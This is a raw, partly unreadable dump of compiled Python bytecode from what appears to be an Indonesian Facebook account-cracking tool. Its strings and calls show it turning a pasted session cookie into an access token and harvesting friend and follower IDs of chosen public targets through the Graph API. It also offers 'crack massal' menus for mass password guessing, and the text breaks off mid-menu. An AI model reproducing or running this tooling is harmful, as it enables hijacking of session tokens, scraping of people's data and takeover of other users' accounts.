01\x01\x00Y\x00nT\x04\x00t\x19t\x1af\x02\x90\x01yv\x01\x00\x01\x00\x01\x00d\x17t\x01\x9b\x00|\x01\x9b\x00d\x19\x9d\x04}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x03\x8d\x02\x83\x01\x01\x00t\x1b\xa0\x1cd\x1a\xa1\x01\x01\x00t\x1b\xa0\x1cd\x1b\xa1\x01\x01\x00t\x1d\x83\x00\x01\x00Y\x00n\x020\x00W\x00d\x00\x04\x00\x04\x00\x83\x03\x01\x00n\x121\x00\x90\x01s\x8e0\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00d\x00S\x00)\x1cNrR\x00\x00\x00zDjangan pake akun pribadi!! harus pake akun tumbal untuk ambil cookiers\x00\x00\x00z\x12 masukkan cookie :r:\x00\x00\x00z4 sedang mengconvert cookie ke token... mohon tunggu z\x13/business_locationsz\x15business.facebook.comr\x08\x00\x00\x00\xfa#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\xfa\tmax-age=0zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8z\x18text/html; charset=utf-8)\trU\x00\x00\x00\xda\x07refererZ\x04host\xda\x06origin\xfa\x19upgrade-insecure-requests\xfa\x0faccept-language\xfa\rcache-control\xda\x06accept\xfa\x0ccontent-typerm\x00\x00\x00)\x02\xda\x07headersrq\x00\x00\x00z\t(EAAG\\w+)r4\x00\x00\x00rn\x00\x00\x00rA\x00\x00\x00rl\x00\x00\x00ru\x00\x00\x00rt\x00\x00\x00rx\x00\x00\x00z\x08 invalidrv\x00\x00\x00rw\x00\x00\x00)\x1er\x05\x00\x00\x00r|\x00\x00\x00r}\x00\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00rL\x00\x00\x00r\x81\x00\x00\x00rj\x00\x00\x00r\x1c\x00\x00\x00rH\x00\x00\x00ry\x00\x00\x00r_\x00\x00\x00rI\x00\x00\x00\xda\rurl_businness\xda\x0bua_business\xda\x06web_fbrK\x00\x00\x00\xda\x06searchrJ\x00\x00\x00\xda\x05grouprC\x00\x00\x00rM\x00\x00\x00r\x82\x00\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r\x83\x00\x00\x00r\x88\x00\x00\x00rW\x00\x00\x00rX\x00\x00\x00r\x84\x00\x00\x00)\x05r\x8a\x00\x00\x00rm\x00\x00\x00Z\x03xyzZ\x07get_tokr\x89\x00\x00\x00rQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\x95\x00\x00\x00\xff\x00\x00\x00s0\x00\x00\x00\x00\x01\x08\x02\n\x01\x12\x01\x1a\x01\x0c\x01\x02\x01\x0e\x01,\x01\x14\x01\x10\x01\x10\x01\x0c\x01\x12\x01\x0e\x01\n\x01\x12\x01\x0c\x01\x16\x01\x12\x01\x10\x01\x12\x01\n\x01\n\x01r\x95\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x19\x00\x00\x00\x1f\x00\x00\x00C\x00\x00\x00s\x00\x05\x00\x00t\x00\x83\x00\x01\x00z\x12t\x01\xa0\x02d\x01\xa1\x01\xa0\x03\xa1\x00}\x00W\x00n\x12\x01\x00\x01\x00\x01\x00d\x02h\x01}\x00Y\x00n\x020\x00z\x0c|\x00d\x03\x19\x00}\x01W\x00n\x12\x01\x00\x01\x00\x01\x00d\x02h\x01}\x01Y\x00n\x020\x00z\x0c|\x00d\x04\x19\x00}\x02W\x00n\x12\x01\x00\x01\x00\x01\x00d\x02h\x01}\x02Y\x00n\x020\x00z\x0c|\x00d\x05\x19\x00}\x03W\x00n\x12\x01\x00\x01\x00\x01\x00d\x02h\x01}\x03Y\x00n\x020\x00z\x0c|\x00d\x06\x19\x00}\x04W\x00n\x12\x01\x00\x01\x00\x01\x00d\x02h\x01}\x04Y\x00n\x020\x00z\x0c|\x00d\x07\x19\x00}\x05W\x00n\x12\x01\x00\x01\x00\x01\x00d\x02h\x01}\x05Y\x00n\x020\x00z\x0c|\x00d\x08\x19\x00}\x06W\x00n\x12\x01\x00\x01\x00\x01\x00d\x02h\x01}\x06Y\x00n\x020\x00z\x0c|\x00d\t\x19\x00}\x07W\x00n\x12\x01\x00\x01\x00\x01\x00d\x02h\x01}\x07Y\x00n\x020\x00z\x0c|\x00d\n\x19\x00}\x08W\x00n\x12\x01\x00\x01\x00\x01\x00d\x02h\x01}\x08Y\x00n\x020\x00t\x04d\x0bd\x0c\x83\x02\xa0\x05\xa1\x00}\td\rt\x04d\x0ed\x0c\x83\x02\xa0\x05\xa1\x00i\x01}\nt\x01\xa0\x06\xa1\x00j\x02d\x0f|\t\x16\x00|\nd\x10\x8d\x02}\x0bt\x03\xa0\x07|\x0bj\x08\xa1\x01}\x0c|\x0cd\x11\x19\x00}\r|\x0cd\x12\x19\x00}\x0et\x01\xa0\x06\xa1\x00j\x02d\x13|\t\x16\x00|\nd\x10\x8d\x02}\x0ft\x03\xa0\x07|\x0fj\x08\xa1\x01}\x10|\x10d\x14\x19\x00}\x11z\x0c|\x10d\x15\x19\x00}\x12W\x00n$\x04\x00t\tt\nf\x02\x90\x01y\xd8\x01\x00\x01\x00\x01\x00t\x0bd\x02\x17\x00t\x0c\x17\x00}\x12Y\x00n\x020\x00z\x0c|\x10d\x16\x19\x00}\x13W\x00n$\x04\x00t\tt\nf\x02\x90\x02y\n\x01\x00\x01\x00\x01\x00t\x0bd\x02\x17\x00t\x0c\x17\x00}\x13Y\x00n\x020\x00z\x0c|\x10d\x17\x19\x00}\x14W\x00n$\x04\x00t\tt\nf\x02\x90\x02y<\x01\x00\x01\x00\x01\x00t\x0bd\x02\x17\x00t\x0c\x17\x00}\x14Y\x00n\x020\x00z\x0c|\x10d\x18\x19\x00}\x15W\x00n$\x04\x00t\tt\nf\x02\x90\x02yn\x01\x00\x01\x00\x01\x00t\x0bd\x02\x17\x00t\x0c\x17\x00}\x15Y\x00n\x020\x00t\rd\x19\x83\x01\x01\x00d\x1at\x0e\x9b\x00t\x0f\x9b\x00d\x1bt\x10\x9b\x00|\r\x9b\x00d\x1ct\x0e\x9b\x00d\x1dt\x11\x9b\x00|\x13\x9b\x00d\x1ct\x0e\x9b\x00d\x1et\x11\x9b\x00|\x0e\x9b\x00d\x1ct\x0e\x9b\x00d\x1ft\x11\x9b\x00|\x01\x9b\x00d\x1ct\x0e\x9b\x00d t\x11\x9b\x00|\x02\x9b\x00d\x1ct\x0e\x9b\x00d!t\x11\x9b\x00t\x12\x9b\x00\x9d\x1f}\x10t\x13t\x14|\x10t\x15\x9b\x00d"\x8d\x02\x83\x01\x01\x00t\rd\x19\x83\x01\x01\x00d\x1at\x0e\x9b\x00d#t\x0e\x9b\x00d$t\x0e\x9b\x00d%t\x16\x9b\x00d&t\x0e\x9b\x00d\'\x9d\x0b}\x10t\x13t\x14|\x10t\x15\x9b\x00d"\x8d\x02\x83\x01\x01\x00t\x17t\x18\x9b\x00d(t\x19\x9b\x00\x9d\x03\x83\x01}\x16|\x16d)v\x00\x90\x03rVt\x1a\x83\x00\x01\x00\x90\x01n\xa6|\x16d*v\x00\x90\x03r\x9ct\rd\x19\x83\x01\x01\x00t\x0e\x9b\x00d+\x9d\x02}\x10t\x13t\x14|\x10t\x15\x9b\x00d"\x8d\x02\x83\x01\x01\x00t\x17t\x18\x9b\x00d,\x9d\x02\x83\x01\x01\x00t\x1b\x83\x00\x01\x00\x90\x01n`|\x16d-v\x00\x90\x04r\xe0t\rd\x19\x83\x01\x01\x00d\x1at\x0e\x9b\x00d.t\x0e\x9b\x00d/t\x0e\x9b\x00d%t\x11\x9b\x00d&t\x0e\x9b\x00d0\x9d\x0b}\x10t\x13t\x14|\x10t\x15\x9b\x00d"\x8d\x02\x83\x01\x01\x00t\x17t\x18\x9b\x00d(t\x19\x9b\x00\x9d\x03\x83\x01}\x17|\x17d)v\x00\x90\x04r\x9et\rd\x19\x83\x01\x01\x00t\x17t\x18\x9b\x00d1t\x0b\x9b\x00d2t\x0c\x9b\x00d3t\x19\x9b\x00d4t\x0c\x9b\x00d5t\x19\x9b\x00\x9d\x0b\x83\x01}\x18|\x18d6v\x00\x90\x04rnt\rd\x19\x83\x01\x01\x00t\x1c\xa0\x1dd7\xa1\x01\x01\x00t\x1c\xa0\x1dd8\xa1\x01\x01\x00t\x1et\x18\x9b\x00d9\x9d\x02\x83\x01\x01\x00t\x1f\x83\x00\x01\x00n.|\x18d:v\x00\x90\x04r\x80t\x1b\x83\x00\x01\x00n\x1ct\rd\x19\x83\x01\x01\x00t\x1et\x18\x9b\x00d;\x9d\x02\x83\x01\x01\x00t\x1b\x83\x00\x01\x00n@|\x17d*v\x00\x90\x04r\xb0t \x83\x00\x01\x00n.|\x17d-v\x00\x90\x04r\xc2t\x1b\x83\x00\x01\x00n\x1ct\rd\x19\x83\x01\x01\x00t\x1et\x18\x9b\x00d;\x9d\x02\x83\x01\x01\x00t\x1b\x83\x00\x01\x00n\x1ct\rd\x19\x83\x01\x01\x00t\x1et\x18\x9b\x00d;\x9d\x02\x83\x01\x01\x00t\x1b\x83\x00\x01\x00d\x00S\x00)<Nz\x17http://ip-api.com/json/r\x14\x00\x00\x00Z\x05queryZ\x07countryZ\x03ispZ\x04city\xda\x08timezoneZ\x0bcountryCodeZ\nregionNameZ\x02asrl\x00\x00\x00r@\x00\x00\x00rm\x00\x00\x00rn\x00\x00\x00ro\x00\x00\x00rp\x00\x00\x00rr\x00\x00\x00\xda\x02idz-https://graph.facebook.com/me?access_token=%sZ\x04linkZ\x05emailZ\x08birthdayZ\x0cmobile_phoneZ\x06localerR\x00\x00\x00rt\x00\x00\x00r:\x00\x00\x00\xfa\x03\n\t\tz\x12tanggal lahirmu : z\nID kamu : z\nIP kamu : z\x0enegara kamu : z\x13tanggal sekarang : rs\x00\x00\x00z\x19[01] crack with public\n\t\tz\x1d[02] checkpoint detectored\n\t\trd\x00\x00\x00r\x8c\x00\x00\x00z\x14] exit/delete cookie\xfa\t pilih : r\x8f\x00\x00\x00r\x91\x00\x00\x00z&\t\tfitur ini dalam masa pengembangan!! z\x15 enter untuk kembali r\x93\x00\x00\x00z\x14[01] hapus cookie\n\t\tz\x0c[02] exit\n\t\tr\x8e\x00\x00\x00z$ anda yakin ingin menghapus cookie (\xda\x01yr?\x00\x00\x00\xda\x01tz\x04) : )\x03\xda\x02yar\xa9\x00\x00\x00r-\x00\x00\x00rv\x00\x00\x00rw\x00\x00\x00z  sukses menghapus cookie bawaan )\x03r\xaa\x00\x00\x00r(\x00\x00\x00\xda\x05tidak\xfa\x10 isi yang benar )!rk\x00\x00\x00rH\x00\x00\x00rI\x00\x00\x00rz\x00\x00\x00rC\x00\x00\x00rD\x00\x00\x00ry\x00\x00\x00r{\x00\x00\x00rJ\x00\x00\x00r\x83\x00\x00\x00r\x88\x00\x00\x00r!\x00\x00\x00r$\x00\x00\x00r\x05\x00\x00\x00r|\x00\x00\x00\xda\x03hhl\xda\x02K2r\x80\x00\x00\x00\xda\x08sekarangr}\x00\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00r\x94\x00\x00\x00r\x81\x00\x00\x00rj\x00\x00\x00r\x1c\x00\x00\x00\xda\x11cracked_publickeyr\x82\x00\x00\x00rW\x00\x00\x00rX\x00\x00\x00r_\x00\x00\x00r\x8b\x00\x00\x00r\x87\x00\x00\x00)\x19Z\x08EwePaksaZ\x02IPZ\x05nibbaZ\nrasis_Z_K_Z\x0crasis_Z_K_X_Z\x0erasis_Z_K_X_R_Z\x10rasis_Z_K_X_R_H_Z\x12rasis_Z_K_X_R_H_M_Z\x14rasis_Z_K_X_R_H_M_P_r\x89\x00\x00\x00rm\x00\x00\x00rI\x00\x00\x00Z\x03jsxZ\x04namaZ\ttumbal_idZ\x02xnr\x8a\x00\x00\x00Z\x03lisZ\x02coZ\x03pkoZ\x06no_kepZ\x03lok\xda\x08HikmatXDZ\x02zk\xda\x01crQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\x82\x00\x00\x00)\x01\x00\x00s\xa8\x00\x00\x00\x00\x01\x06\x01\x14\x01\x12\x01\x0e\x01\x12\x01\x0e\x01\x12\x01\x0e\x01\x12\x01\x0e\x01\x12\x01\x0e\x01\x12\x01\x0e\x01\x12\x01\x0e\x01\x12\x01\x0e\x01\x12\x01\x0e\x01\x12\x01\x16\x01\x0c\x01\x08\x01\x08\x01\x16\x01\x0c\x01\x08\x01\x0e\x01\x12\x01\x12\x01\x0e\x01\x12\x01\x12\x01\x0e\x01\x12\x01\x12\x01\x0e\x01\x12\x01\x12\x01\x08\x01h\x01\x12\x01\x08\x01$\x01\x12\x01\x12\x01\n\x01\n\x01\n\x01\x08\x01\n\x01\x12\x01\x0e\x01\n\x02\n\x01\x08\x01$\x01\x12\x01\x12\x01\n\x01\x08\x01*\x01\n\x01\x08\x01\n\x01\n\x01\x0e\x01\x08\x01\n\x01\x08\x02\x08\x01\x0e\x01\x08\x01\n\x01\x08\x01\n\x01\x08\x02\x08\x01\x0e\x01\x08\x02\x08\x01\x0e\x01r\x82\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x00\x00C\x00\x00\x00sb\x00\x00\x00t\x00t\x01\x9b\x00d\x01t\x02\x9b\x00d\x02t\x03\x9b\x00d\x03t\x04\x9b\x00d\x04t\x03\x9b\x00d\x05t\x02\x9b\x00\x9d\x0b\x83\x01}\x00|\x00d\x06v\x00r:t\x05\x83\x00\x01\x00n$|\x00d\x07v\x00rJt\x06\x83\x00\x01\x00n\x14t\x07t\x01\x9b\x00d\x08\x9d\x02\x83\x01\x01\x00t\x08\x83\x00\x01\x00d\x00S\x00)\tNz! apakah anda ingin crack massal (r\xa9\x00\x00\x00r?\x00\x00\x00r\xaa\x00\x00\x00z\x06) ? : )\x02r\xa9\x00\x00\x00r-\x00\x00\x00)\x02r\xaa\x00\x00\x00r(\x00\x00\x00r\xad\x00\x00\x00)\tr\x81\x00\x00\x00rj\x00\x00\x00r\x1c\x00\x00\x00r$\x00\x00\x00r!\x00\x00\x00\xda\x15massal_cracked_public\xda\x0ecracked_publicr_\x00\x00\x00r\xb1\x00\x00\x00)\x01Z\x03cuyrQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\xb1\x00\x00\x00\x83\x01\x00\x00s\x0e\x00\x00\x00\x00\x01*\x01\x08\x01\x08\x01\x08\x01\x08\x02\x0e\x01r\xb1\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\n\x00\x00\x00C\x00\x00\x00s\xec\x02\x00\x00t\x00d\x01\x83\x01\x01\x00d\x02t\x01\x9b\x00d\x03\x9d\x03}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x04\x8d\x02\x83\x01\x01\x00z\x1ct\x05t\x06t\x07d\x05\x17\x00t\x08\x17\x00d\x06\x17\x00\x83\x01\x83\x01}\x01W\x00n$\x04\x00t\tyf\x01\x00\x01\x00\x01\x00t\nt\x07d\x07\x17\x00\x83\x01\x01\x00t\x0b\x83\x00\x01\x00Y\x00n\x020\x00|\x01d\x08k\x00sx|\x01d\tk\x04r\x8at\nt\x07d\n\x17\x00\x83\x01\x01\x00t\x0b\x83\x00\x01\x00t\x0c\xa0\r\xa1\x00}\x02d\x0b}\x03d\x02t\x01\x9b\x00d\x0ct\x0e\x9b\x00d\rt\x01\x9b\x00d\x0e\x9d\x07}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x04\x8d\x02\x83\x01\x01\x00t\x0f|\x01\x83\x01D\x00]>}\x04|\x03d\x087\x00}\x03t\x06t\x07d\x0f\x17\x00t\x08\x17\x00t\x10|\x03\x83\x01\x17\x00t\x11\x17\x00d\x10\x17\x00t\x08\x17\x00d\x06\x17\x00\x83\x01}\x05t\x12\xa0\x13|\x05\xa1\x01\x01\x00q\xc8t\x12D\x00\x90\x01]J}\x06\x90\x01z\x00t\x14d\x11d\x12\x83\x02\xa0\x15\xa1\x00}\x07t\x14d\x13d\x12\x83\x02\xa0\x15\xa1\x00}\x08d\x14|\x08i\x01}\tt\x0cj\x16d\x15|\x06|\x07f\x02\x16\x00|\td\x16\x8d\x02}\nt\x17\xa0\x18|\nj\x19\xa1\x01}\x0bz\x0c|\x0bd\x17\x19\x00}\x0cW\x00n$\x04\x00t\x1at\x1bf\x02\x90\x01y\x8c\x01\x00\x01\x00\x01\x00t\x1cd\x18\x17\x00t\x11\x17\x00}\x0cY\x00n\x020\x00t\x14d\x11d\x12\x83\x02\xa0\x15\xa1\x00}\x07t\x14d\x13d\x12\x83\x02\xa0\x15\xa1\x00}\x08d\x14|\x08i\x01}\tt\x0cj\x16d\x19|\x06|\x07f\x02\x16\x00|\td\x16\x8d\x02\xa0\x17\xa1\x00}\r|\rd\x1a\x19\x00d\x1b\x19\x00D\x00]8}\x0ez\x1et\x1d\xa0\x13|\x0ed\x1c\x19\x00d\x1d\x17\x00|\x0ed\x17\x19\x00\x17\x00\xa1\x01\x01\x00W\x00n\x12\x01\x00\x01\x00\x01\x00Y\x00\x90\x01q\xd8Y\x00n\x020\x00\x90\x01q\xd8W\x00n@\x04\x00t\x1at\x1bf\x02\x90\x02y,\x01\x00\x01\x00\x01\x00Y\x00n*\x04\x00t\x0cj\x1ej\x1f\x90\x02yT\x01\x00\x01\x00\x01\x00t\nt\x07d\x1e\x17\x00\x83\x01\x01\x00t \x83\x00\x01\x00Y\x00n\x020\x00\x90\x01q\x0ct!t\x1d\x83\x01d\x0bk\x02\x90\x02r\xa6t\x01\x9b\x00d\x1ft"\x9b\x00t\x10t!t\x1d\x83\x01\x83\x01\x9b\x00d t\x01\x9b\x00d!t"\x9b\x00|\x0c\x9b\x00\x9d\t}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x04\x8d\x02\x83\x01\x01\x00n<t\x01\x9b\x00d\x1ft\x0e\x9b\x00t\x10t!t\x1d\x83\x01\x83\x01\x9b\x00d t\x01\x9b\x00d!t\x0e\x9b\x00|\x0c\x9b\x00\x9d\t}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x04\x8d\x02\x83\x01\x01\x00t#\x83\x00\x01\x00d\x00S\x00)"NrR\x00\x00\x00rt\x00\x00\x00\xfa(target harus public & banyak friends nyars\x00\x00\x00z\x10 mau berapa id :r:\x00\x00\x00z  yang kamu ketik itu bukan nomorr4\x00\x00\x00\xe9\x14\x00\x00\x00z\x1d kesalahan yang tidak terdugar\x01\x00\x00\x00\xfa\x06ketik \xda\x02me\xfa\x1c untuk crack dari pertemananz\x0f masukan id ke z\x02 :rl\x00\x00\x00r@\x00\x00\x00rn\x00\x00\x00rm\x00\x00\x00\xfa-https://graph.facebook.com/%s?access_token=%srp\x00\x00\x00rr\x00\x00\x00r\x14\x00\x00\x00\xfaIhttps://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s\xda\x07friends\xda\x04datar\xa6\x00\x00\x00\xfa\x01|\xfa\x1d koneksi internet bermasalah \xfa\r\t\ttotal id : r\xa7\x00\x00\x00\xfa\x11nama id target : )$r\x05\x00\x00\x00r|\x00\x00\x00r}\x00\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00\xda\x03intr\x81\x00\x00\x00rj\x00\x00\x00r\x1c\x00\x00\x00\xda\nValueErrorr_\x00\x00\x00r\x82\x00\x00\x00rH\x00\x00\x00ry\x00\x00\x00r\x80\x00\x00\x00\xda\x05rangerL\x00\x00\x00r$\x00\x00\x00\xda\x03uidrG\x00\x00\x00rC\x00\x00\x00rD\x00\x00\x00rI\x00\x00\x00rz\x00\x00\x00r{\x00\x00\x00rJ\x00\x00\x00r\x83\x00\x00\x00r\x88\x00\x00\x00r!\x00\x00\x00r\xa6\x00\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r\x87\x00\x00\x00\xda\x03lenr\x94\x00\x00\x00\xda\nsettingers)\x0fr\x8a\x00\x00\x00Z\x03jum\xda\x03sesZ\x02yz\xda\x03metZ\x02klZ\x05userrr\x89\x00\x00\x00rm\x00\x00\x00\xda\x04coki\xda\x03coa\xda\x02el\xda\x02lk\xda\x04cyna\xda\x04fuckrQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\xb4\x00\x00\x00\x8d\x01\x00\x00s^\x00\x00\x00\x00\x01\x08\x01\x0c\x01\x12\x01\x02\x01\x1c\x01\x0c\x01\x0c\x01\x0c\x01\x10\x01\x0c\x01\x06\x01\x08\x01\x04\x01\x18\x01\x12\x01\x0c\x01\x08\x01(\x01\x0c\x01\n\x01\x04\x01\x0e\x01\x0e\x01\x08\x01\x16\x01\x0c\x01\x0e\x01\x12\x01\x12\x01\x0e\x01\x0e\x01\x08\x01\x1a\x01\x10\x01 \x01\x1a\x01\x12\x01\x04\x01\x12\x01\x0c\x01\x10\x01\x0e\x01*\x01\x14\x02*\x01\x12\x01r\xb4\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x10\x00\x00\x00C\x00\x00\x00sv\x02\x00\x00t\x00d\x01\x83\x01\x01\x00d\x02t\x01\x9b\x00d\x03\x9d\x03}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x04\x8d\x02\x83\x01\x01\x00d\x02t\x01\x9b\x00d\x05t\x05\x9b\x00d\x06t\x01\x9b\x00d\x07\x9d\x07}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x04\x8d\x02\x83\x01\x01\x00t\x06t\x07d\x08\x17\x00t\x08\x17\x00d\t\x17\x00\x83\x01}\x01\x90\x01z\xb8t\td\nd\x0b\x83\x02\xa0\n\xa1\x00}\x02t\td\x0cd\x0b\x83\x02\xa0\n\xa1\x00}\x03d\r|\x03i\x01}\x04t\x0bj\x0cd\x0e|\x01|\x02f\x02\x16\x00|\x04d\x0f\x8d\x02}\x05t\r\xa0\x0e|\x05j\x0f\xa1\x01}\x06z\x0c|\x06d\x10\x19\x00}\x07W\x00n"\x04\x00t\x10t\x11f\x02y\xdc\x01\x00\x01\x00\x01\x00t\x12d\x11\x17\x00t\x13\x17\x00}\x07Y\x00n\x020\x00t\td\nd\x0b\x83\x02\xa0\n\xa1\x00}\x02t\td\x0cd\x0b\x83\x02\xa0\n\xa1\x00}\x03d\r|\x03i\x01}\x04t\x0bj\x0cd\x12|\x01|\x02f\x02\x16\x00|\x04d\x0f\x8d\x02\xa0\r\xa1\x00}\x08|\x08d\x13\x19\x00d\x14\x19\x00D\x00]8}\tz\x1et\x14\xa0\x15|\td\x15\x19\x00d\x16\x17\x00|\td\x10\x19\x00\x17\x00\xa1\x01\x01\x00W\x00n\x12\x01\x00\x01\x00\x01\x00Y\x00\x90\x01q(Y\x00n\x020\x00\x90\x01q(t\x0bj\x0cd\x17|\x01|\x02f\x02\x16\x00|\x04d\x0f\x8d\x02\xa0\r\xa1\x00}\n|\nd\x18\x19\x00d\x14\x19\x00D\x00]8}\x0bz\x1et\x16\xa0\x15|\x0bd\x15\x19\x00d\x16\x17\x00|\x0bd\x10\x19\x00\x17\x00\xa1\x01\x01\x00W\x00n\x12\x01\x00\x01\x00\x01\x00Y\x00\x90\x01q\x88Y\x00n\x020\x00\x90\x01q\x88t\x01\x9b\x00d\x19t\x05\x9b\x00t\x17t\x18t\x14\x83\x01\x83\x01\x9b\x00d\x1at\x01\x9b\x00d\x1bt\x05\x9b\x00|\x07\x9b\x00d\x1ct\x01\x9b\x00d\x1dt\x05\x9b\x00t\x17t\x18t\x16\x83\x01\x83\x01\x9b\x00\x9d\x0e}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x04\x8d\x02\x83\x01\x01\x00t\x19\x83\x00\x01\x00W\x00nR\x04\x00t\x0bj\x1aj\x1b\x90\x02yH\x01\x00\x01\x00\x01\x00t\x1ct\x07d\x1e\x17\x00\x83\x01\x01\x00t\x1d\x83\x00\x01\x00Y\x00n*\x04\x00t\x10t\x11f\x02\x90\x02yp\x01\x00\x01\x00\x01\x00t\x1ct\x07d\x1f\x17\x00\x83\x01\x01\x00t\x1d\x83\x00\x01\x00Y\x00n\x020\x00d\x00S\x00) NrR\x00\x00\x00rt\x00\x00\x00r\xb6\x00\x00\x00rs\x00\x00\x00r\xb8\x00\x00\x00r\xb9\x00\x00\x00r\xba\x00\x00\x00z\x13 target id public :r:\x00\x00\x00rl\x00\x00\x00r@\x00\x00\x00rn\x00\x00\x00rm\x00\x00\x00r\xbb\x00\x00\x00rp\x00\x00\x00rr\x00\x00\x00r\x14\x00\x00\x00r\xbc\x00\x00\x00r\xbd\x00\x00\x00r\xbe\x00\x00\x00r\xa6\x00\x00\x00r\xbf\x00\x00\x00zMhttps://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%sZ\x0bsubscribersr\xc1\x00\x00\x00r\xa7\x00\x00\x00r\xc2\x00\x00\x00rB\x00\x00\x00z\x17\t\ttotal id followers : r\xc0\x00\x00\x00z9 gagal dump id... mungkin privat friends/gada friends nya)\x1er\x05\x00\x00\x00r|\x00\x00\x00r}\x00\x00\x00r~\x00\x00\x00r\x7f\x00\x00\x00r\x80\x00\x00\x00r\x81\x00\x00\x00rj\x00\x00\x00r\x1c\x00\x00\x00rC\x00\x00\x00rD\x00\x00\x00rH\x00\x00\x00rI\x00\x00\x00rz\x00\x00\x00r{\x00\x00\x00rJ\x00\x00\x00r\x83\x00\x00\x00r\x88\x00\x00\x00r!\x00\x00\x00r$\x00\x00\x00r\xa6\x00\x00\x00rG\x00\x00\x00\xda\x03id3rL\x00\x00\x00r\xc7\x00\x00\x00r\xc8\x00\x00\x00r\x85\x00\x00\x00r\x86\x00\x00\x00r_\x00\x00\x00r\x87\x00\x00\x00)\x0cr\x8a\x00\x00\x00Z\x03putr\x89\x00\x00\x00rm\x00\x00\x00r\xcb\x00\x00\x00r\xcc\x00\x00\x00r\xcd\x00\x00\x00r\xce\x00\x00\x00r\xcf\x00\x00\x00r\xd0\x00\x00\x00Z\x04ciniZ\x03fakrQ\x00\x00\x00rQ\x00\x00\x00rR\x00\x00\x00r\xb5\x00\x00\x00\xbf\x01\x00\x00sF\x00\x00\x00\x00\x01\x08\x01\x0c\x01\x12\x01\x18\x01\x12\x01\x14\x01\x04\x01\x0e\x01\x0e\x01\x08\x01\x16\x01\x0c\x01\x0e\x01\x10\x01\x12\x01\x0e\x01\x0e\x01\x08\x01\x1a\x01\x10\x01 \x01\x16\x01\x1a\x01\x10\x01 \x01\x16\x02B\x01\x12\x01\n\x01\x12\x01\x0c\x01\n\x01\x12\x01\x0c\x01r\xb5\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x12\x00\x00\x00C\x00\x00\x00s\xce\x01\x00\x00t\x00d\x01\x83\x01\x01\x00d\x02t\x01\x9b\x00d\x03t\x01\x9b\x00d\x04t\x01\x9b\x00d\x05\x9d\x07}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x06\x8d\x02\x83\x01\x01\x00t\x05t\x06d\x07\x17\x00t\x07\x17\x00\x83\x01}\x01|\x01d\x08v\x00rtt\x08D\x00]\x0e}\x02t\t\xa0\n|\x02\xa1\x01\x01\x00qNt\x0bD\x00]\x0e}\x03t\x0c\xa0\n|\x03\xa1\x01\x01\x00qbn\xa0|\x01d\tv\x00r\xaat\x08D\x00]\x10}\x02t\t\xa0\rd\n|\x02\xa1\x02\x01\x00q\x80t\x0bD\x00]\x10}\x03t\x0c\xa0\rd\n|\x03\xa1\x02\x01\x00q\x96nj|\x01d\x0bv\x00\x90\x01r\x02t\x08D\x00] }\x02t\x0e\xa0\x0fd\nt\x10t\t\x83\x01\xa1\x02}\x04t\t\xa0\r|\x04|\x02\xa1\x02\x01\x00q\xb8t\x0bD\x00] }\x03t\x0e\xa0\x0fd\nt\x10t\x0c\x83\x01\xa1\x02}\x04t\x0c\xa0\r|\x04|\x02\xa1\x02\x01\x00q\xden\x12t\x11t\x06d\x0c\x17\x00\x83\x01\x01\x00t\x12\x83\x00\x01\x00t\x00d\x01\x83\x01\x01\x00d\x02t\x01\x9b\x00d\rt\x13\x9b\x00d\x0et\x01\x9b\x00d\x0ft\x01\x9b\x00d\rt\x13\x9b\x00d\x10t\x01\x9b\x00d\x11t\x01\x9b\x00d\x12t\x13\x9b\x00d\x13t\x01\x9b\x00\x9d\x12}\x00t\x02t\x03|\x00t\x04\x9b\x00d\x06\x8d\x02\x83\x01\x01\x00t\x05t\x06\x9b\x00d\x14t\x07\x9b\x00d\x13t\x14\x9b\x00d\x15t\x07\x9b\x00d\x10t\x14\x9b\x00d\x16t\x07\x9b\x00\x9d\x0b\x83\x01}\x05|\x05d\x17v\x00\x90\x01r\xa4t\x15\x83\x00\x01\x00n&|\x05d\x18v\x00\x90\x01r\xb6t\x16\x83\x00\x01\x00n\x14t\x11t\x06\x9b\x00d\x19\x9d\x02\x83\x01\x01\x00t\x17\x83\x00\x01\x00d\x00S\x00)\x1aNrR\x00\x00\x00rt\x00\x00\x00z\x18[01] crack urutan new\n\t\tz\x18[02] crack urutan old\n\t\tz\x18[03] crack urutan randomrs\x00\x00\x00r\xa8\x00\x00\x00r\x91\x00\x00\x00r\x8f\x00\x00\x00r\x01\x00\x00\x00)\x02r\n\x00\x00\x00\xda\x0203z\x0f isi yang benarr\xb8\x00\x00\x00z\x02d z\x1cuntuk lanjut crack public\n\t\t\xda\x01mz  untuk lanjut crack followers\n\t\tz(kalo kamu pilih crack massal pilih saja \xda\x01dz\x07 pilih r?\x00\x00\x00z\x03 : 